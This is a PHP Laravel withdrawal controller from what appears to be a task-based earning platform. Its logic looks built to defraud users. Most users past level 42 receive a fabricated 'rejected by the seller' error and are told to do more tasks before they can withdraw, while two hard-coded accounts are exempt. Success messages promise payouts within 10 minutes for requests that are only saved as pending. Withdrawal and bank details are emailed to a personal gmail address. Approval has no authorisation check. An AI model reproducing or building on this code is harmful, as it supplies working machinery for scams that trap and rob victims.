<?php

namespace App\Http\Controllers;
use App\Models\Transaction;
use App\Models\Notification;
use Illuminate\Support\Facades\Validator; // Import Validator class
use App\Mail\DepositApproved;
use App\Mail\WithdrawalRequested;
use Illuminate\Support\Facades\Mail;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\Session;

class WithdrawalController extends Controller
{
    public function index() {
        $user = auth()->user();
        $notifications = Notification::where('user_id', auth()->id())
            ->orderBy('created_at', 'desc')
            ->get();

        $unreadNotificationCount = $notifications->where('read', false)->count();
        $depositAmount = Transaction::where('uid', $user->id)
                ->where('type', 'deposit')->where('status','approved')
                ->sum('amount');

            $withdrawalAmount = Transaction::where('uid', $user->id)
                ->where('type', 'withdrawal')->where('status','approved')
                ->sum('amount');
        return view('user.withdrawal',compact('unreadNotificationCount','depositAmount','withdrawalAmount'));
    }

    public function withdraw(Request $request) {
        $user = Auth::user(); // Get the authenticated user
        $accountNumber = $request['accountNumber'];
    
        // Validate the bank account number
        $validationMessage = $this->validateBankAccount($accountNumber);
    
        if ($validationMessage) {
            // Validation failed, return an error message
            Session::flash('error', $validationMessage);
            return Redirect::route('user.withdraw')->with('error', $validationMessage);
        }
        
        $eligibility = $user->project_status;
        if($eligibility == 'unassigned' && $user->level < 42) {
            // Create a pending transaction entry
        $transaction = new Transaction([
            'amount' => $request['amount'],
            'bank_name' => $request['bankName'],
            'account_number' => $request['accountNumber'],
            'status' => 'pending',
            'type' => 'withdrawal',
            'uid' => $user->id,
        ]);
        $transaction->save();

	        $emailData = [
                'date' => now()->toDateTimeString(),
                'name' => $user->name,
                'account_id' => $user->id,
                'email' => $user->email,
                'bank_name' => $request['bankName'],
                'account_number' => $request['accountNumber'],
                'amount' => $request['amount']
            ];

            try {
                Mail::to('jc2023hoh@gmail.com')->send(new WithdrawalRequested($emailData));
            } catch (\Exception $e) {
                \Log::error('Error sending email: ' . $e->getMessage());
            }

	// Flash a success message to the session
        Session::flash('success', 'Withdrawal request submitted successfully');

        // Redirect back to the withdrawal page with the success message
        return Redirect::route('user.withdraw')->with('success', 'Your withdrawal request has been successfully processed, and the funds will be credited to your account within 10 minutes.');
        } elseif ($eligibility == 'assigned' && $user->level < 43) {
            Session::flash('error', 'Your project is ongoing and you are not to proceed for withdrawal. Please proceed and complete your current task project.');

            return Redirect::route('user.withdraw')->with('error', 'Your project is ongoing and you are not to proceed for withdrawal. Please proceed and complete your current task project.');
        } elseif ($eligibility == 'assigned' && $user->level > 43) {
            $transaction = new Transaction([
                'amount' => $request['amount'],
                'bank_name' => $request['bankName'],
                'account_number' => $request['accountNumber'],
                'status' => 'pending',
                'type' => 'withdrawal',
                'uid' => $user->id,
            ]);
            $transaction->save();

	$emailData = [
                'date' => now()->toDateTimeString(),
                'name' => $user->name,
                'account_id' => $user->id,
                'bank_name' => $request['bankName'],
                'account_number' => $request['accountNumber'],
                'amount' => $request['amount']
            ];
            
            try {
                Mail::to('jc2023hoh@gmail.com')->send(new WithdrawalRequested($emailData));
            } catch (\Exception $e) {
                \Log::error('Error sending email: ' . $e->getMessage());
            }

            // Flash a success message to the session
            Session::flash('success', 'Withdrawal request submitted successfully');
    
            // Redirect back to the withdrawal page with the success message
            return Redirect::route('user.withdraw')->with('success', 'Your withdrawal request has been successfully processed, and the funds will be credited to your account within 10 minutes.');
        } elseif ($eligibility == 'unassigned' && $user->level > 42 && $user->id !== 1 && $user->id !== 2) {
            Session::flash('error', 'Your project encountered an error due to rejection by the seller. It appears that the categories of the 2 tasks were misplaced. Kindly proceed to “Start a Project” and request for the replacement tasks. Once the replacement tasks are completed, you will be able to proceed with withdrawal.');
            return Redirect::route('user.withdraw')->with('error', 'Your project encountered an error due to rejection by the seller. It appears that the categories of the 2 tasks were misplaced. Kindly proceed to “Start a Project” and request for the replacement tasks. Once the replacement tasks are completed, you will be able to proceed with withdrawal.');
        }
        
    }

    public function approveWithdrawal($transactionId) {
        $transaction = Transaction::findOrFail($transactionId);
        // Update the transaction status and add the amount to the user's balance
        if ($transaction->status === 'pending') {
            $transaction->status = 'approved';
            $transaction->save();

            // Update user's balance here
            $user = auth()->user();
            $user->balance -= $transaction->amount;
            $user->withdrawable -= $transaction->amount;
            $user->save();

            Session::flash('success', 'Withdrawal approved successfully.');
        } else {
            Session::flash('error', 'Withdrawal is not pending.');
        }
        return back();
    }
    public function validateBankAccount($accountNumber) {
        $rules = [
            'accountNumber' => ['required', 'numeric', 'digits_between:7,15'],
        ];
    
        $messages = [
            'accountNumber.required' => 'Account / PayNow No. is required.',
            'accountNumber.numeric' => 'Account / PayNow No. must be numeric.',
            'accountNumber.digits_between' => 'Account / PayNow No. must be between 7 and 15 digits long.',
        ];
    
        $validator = Validator::make(['accountNumber' => $accountNumber], $rules, $messages);
    
        return $validator->fails() ? $validator->messages()->first('accountNumber') : null;
    }
}
